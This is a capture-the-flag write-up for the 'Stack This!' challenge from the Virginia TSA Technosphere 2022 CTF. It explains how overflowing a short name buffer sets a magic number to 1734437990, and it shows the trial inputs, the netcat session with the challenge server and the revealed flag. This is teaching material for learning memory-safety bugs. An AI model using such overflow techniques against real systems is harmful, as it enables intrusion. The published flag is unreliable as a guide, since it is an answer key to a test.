# Stack This! (100)
#### pwn - Virginia TSA Technosphere 2022 CTF

## Challenge description:
> Quite ironically, the CTFd engineers are hard at work on a new utility for [stack smashing](https://wiki.c2.com/?StackSmashing) and seem to have put a stack vulnerability into the very same program.
> 
> Download file: [stackthis](./../assets/stackthis)

## Solution 
We are given a binary and information to connect to a server with netcat.

After marking it as executable with `chmod +x stackthis`, running the binary asks for a name and returns a magic number. It also says entering a text with a "magic number" of 1734437990 will return the flag.

Using trial-and-error with the local binary, I found the string returning 1734437990. This was over five characters as to overflow the buffer allowing for stack-smashing.

```
AAAAAAAA = 1094795585
BBBBBBBBB = 1111638594
ZZZZZZZZZZ = 1515870810
aaaaaaaaaaa = 1633771873
zzzzzzzzzzzz = 2054847098
fffffffffffff = 1717986918
gggggggff = 1717987175
flag{flagflag} = 1734437990
```

Submitting this to the netcat server yielded the flag.

```
$ nc 0.cloud.chals.io 15343
*** CTFd StackSmasker Version .0001alpha

*** Since this is an alpha product, we are asking customers
    to keep all input limited to 5 characters or less

*** Rumor has it that getting it to print 1734437990 might produce a
    flag, though.

What is your name? flag{flagflag}
magicNumber: 1734437990
******************
```

<details> 
    <summary>Flag</summary>
flag{funandprofit}
</details>